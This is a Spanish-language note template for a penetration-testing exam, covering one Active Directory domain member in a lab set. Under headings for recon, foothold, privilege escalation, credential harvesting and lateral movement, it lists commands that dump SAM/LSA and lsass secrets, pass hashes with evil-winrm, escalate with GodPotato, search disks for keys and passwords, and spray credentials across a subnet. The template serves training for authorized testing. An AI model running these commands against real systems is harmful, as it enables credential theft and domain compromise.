# 🪟 AD — Miembro 2 — `<IP>`

> **Rol**: cliente del dominio · **Estado**: ⬜ · 🟡 · ✅
> **Puntos**: acceso ☐ (10) · escalada ☐ (10) → **☐ 10** (el set AD es 10+10+20)

[[00-dashboard|Panel]] · [[ad-credenciales|Creds AD]] · [[AD-walkthrough|Walkthrough AD]] · [[LPE-Windows]] · [[05-active-directory|AD (guía)]]

---

## 0. Datos rápidos

| Dato | Valor |
| --- | --- |
| IP | |
| Hostname | |
| SO | Windows Server |
| Rol | miembro del dominio |
| Vector de entrada | |
| Vector de escalada | |

## 🔑 Credenciales / hashes de ESTA máquina

| Usuario | Contraseña | Hash | Notas |
| --- | --- | --- | --- |
| | | | |

> Copiá también a [[ad-credenciales]] si sirven para otras máquinas.

---

## 1. Recon

```bash
export IP=''; export DOMAIN=''; export DC_IP=''
sudo nmap -p- --min-rate 5000 -T4 -oA ~/examen/nmap/$IP-alltcp $IP
ports=$(grep -oP '^\d+' ~/examen/nmap/$IP-alltcp.nmap | sort -u | paste -sd,)
sudo nmap -sCV -p$ports -oA ~/examen/nmap/$IP-services $IP
```
```text
▶ OUTPUT
```
📸 Captura: `______`

---

## 2. Enumeración

**Del dominio (con las creds que tengas):**
```bash
nxc smb $DC_IP -u "$USER" -p "$PASS" -d "$DOMAIN" --shares --users --groups --loggedon-users
nxc ldap $DC_IP -u "$USER" -p "$PASS" -d "$DOMAIN" --pass-pol
bloodhound-python -u "$USER" -p "$PASS" -d "$DOMAIN" -ns "$DC_IP" -c all --zip
```
```text
▶ OUTPUT
```

**De esta máquina:**
```bash
nxc smb $IP -u "$USER" -p "$PASS" -d "$DOMAIN" --shares
nxc smb $IP -u "$USER" -p "$PASS" -d "$DOMAIN" --local-auth --sam --lsa
```
```text
▶ OUTPUT
```
📸 Captura: `______`

> ¿Qué me dio acceso a esta máquina? (creds reutilizadas / PtH / vulnerabilidad)

---

## 3. Foothold

```bash
# creds / PtH / vuln
evil-winrm -i $IP -u "$USER" -p "$PASS"
evil-winrm -i $IP -u "$USER" -H "$NTHASH"
nxc winrm $IP -u "$USER" -p "$PASS" -d "$DOMAIN" -x 'whoami'
```
```text
▶ OUTPUT
```
📸 Captura del acceso: `______`

---

## 4. `local.txt`

```cmd
type C:\Users\<user>\Desktop\local.txt & ipconfig
```
```text
▶ OUTPUT
```
📸 **Captura (contenido + IP):** `______` ✅

---

## 5. LPE Windows → [[LPE-Windows]]

```cmd
whoami /all & whoami /priv
potato_check64.exe
```
```text
▶ OUTPUT
```
- [ ] `SeImpersonate` → `GodPotato.exe -cmd "cmd /c whoami"`
- [ ] Servicios mal configurados
- [ ] Tareas programadas (buscar **contraseñas** en ellas) / autoruns
- [ ] Credenciales guardadas (`cmdkey /list`, unattend, web.config)
- [ ] `AlwaysInstallElevated` · `SeBackup/SeDebug` · UAC · kernel

```bash
# ▶ comando de escalada
```
```text
▶ OUTPUT
```
📸 Captura de SYSTEM/admin: `______`

---

## 6. Harvest de credenciales (clave para avanzar en el set)

```bash
nxc smb $IP -u Administrator -p "$PASS" -d "$DOMAIN" --sam --lsa
secretsdump.py "$DOMAIN/$USER:$PASS@$IP"
```
```bash
procdump64.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp   # y pypykatz en Kali
```
```cmd
cmdkey /list
dir /s /b C:\ | findstr /i "unattend.xml web.config .kdbx id_rsa"
```
```text
▶ OUTPUT
```
📸 Captura: `______`

> **Credenciales nuevas → a [[ad-credenciales]] y a probar en [[ad-miembro-1]] y [[ad-dc]].**

---

## 7. Movimiento lateral

```bash
nxc smb 10.10.10.0/24 -u "$USER" -p "$PASS" -d "$DOMAIN" --continue-on-success
nxc smb 10.10.10.0/24 -u "$USER" -H "$NTHASH" -d "$DOMAIN" --continue-on-success
nxc smb 10.10.10.0/24 -u "$USER" -p "$PASS" -d "$DOMAIN" --loggedon-users
```
```text
▶ OUTPUT
```

---

## 8. `proof.txt`

```cmd
type C:\Users\Administrator\Desktop\proof.txt & ipconfig
```
```text
▶ OUTPUT
```
📸 **Captura (contenido + IP):** `______` ✅

---

## 9. Loot y notas

**Pendientes / próximos pasos:**
```

```
